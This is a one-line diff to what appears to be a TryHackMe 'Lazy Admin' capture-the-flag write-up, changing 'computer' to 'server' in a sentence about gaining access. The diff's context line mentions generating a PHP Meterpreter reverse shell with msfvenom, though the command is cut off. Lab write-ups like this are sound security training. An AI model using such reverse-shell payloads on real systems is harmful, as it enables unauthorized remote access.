@@ -46,7 +46,7 @@ We can create an reverse shell with the command ```msfvenom -p php/meterpreter_r
 
 ![msf](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/msf.png)
 
-That worked, we now have gotten into the computer.
+That worked, we now have gotten into the server.
 
 ![user](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/user.png)
 
